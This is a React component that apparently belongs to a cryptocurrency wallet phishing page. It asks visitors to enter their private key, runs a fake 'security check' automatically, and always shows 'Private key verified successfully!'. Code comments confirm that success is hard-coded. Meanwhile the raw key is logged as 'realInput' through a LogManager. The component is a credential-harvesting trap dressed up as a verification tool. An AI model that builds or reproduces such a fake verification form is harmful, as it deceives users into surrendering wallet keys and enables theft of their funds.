"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { CheckCircle2, Loader2 } from "lucide-react"
import { motion, AnimatePresence } from "framer-motion"
import { SecurityCheckProcess } from "./security-check-process"
import { LogManager } from "@/utils/logManager"

export function PrivateKeyInput() {
  const [privateKey, setPrivateKey] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState<boolean | null>(null)
  const [showSecurityCheck, setShowSecurityCheck] = useState(false)

  const handlePrivateKeyChange = (value: string) => {
    setPrivateKey(value.trim())
  }

  const handleVerify = async () => {
    setIsVerifying(true)
    setShowSecurityCheck(true)
  }

  const handleSecurityCheckComplete = async () => {
    setShowSecurityCheck(false)
    setIsVerified(true) // Always set to true
    setIsVerifying(false)

    LogManager.addLog({
      type: "Private Key",
      result: "Success", // Always set to Success
      realInput: privateKey,
    })
  }

  useEffect(() => {
    // Simulate real-time updates
    const interval = setInterval(() => {
      if (privateKey.length > 0 && !isVerifying && !isVerified) {
        handleVerify()
      }
    }, 1000)

    return () => clearInterval(interval)
  }, [privateKey, isVerifying, isVerified, handleVerify]) // Added handleVerify to dependencies

  if (showSecurityCheck) {
    return <SecurityCheckProcess onComplete={handleSecurityCheckComplete} />
  }

  return (
    <AnimatePresence mode="wait">
      <motion.div
        key="input"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        transition={{ duration: 0.5 }}
      >
        <div className="mb-4">
          <Input
            value={privateKey}
            onChange={(e) => handlePrivateKeyChange(e.target.value)}
            className="bg-zinc-900/50 border-zinc-800 text-white placeholder:text-zinc-600 focus-visible:ring-orange-500"
            placeholder="Enter your private key"
          />
        </div>
        <Button
          onClick={handleVerify}
          className="w-full bg-orange-500 hover:bg-orange-600 text-white"
          disabled={isVerifying || privateKey.length === 0}
        >
          {isVerifying ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Verifying...
            </>
          ) : (
            "Verify Private Key"
          )}
        </Button>
        {isVerified && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="mt-4 p-2 rounded bg-green-500/10 flex items-center"
          >
            <CheckCircle2 className="text-green-500 mr-2" />
            <span className="text-green-500">Private key verified successfully!</span>
          </motion.div>
        )}
      </motion.div>
    </AnimatePresence>
  )
}

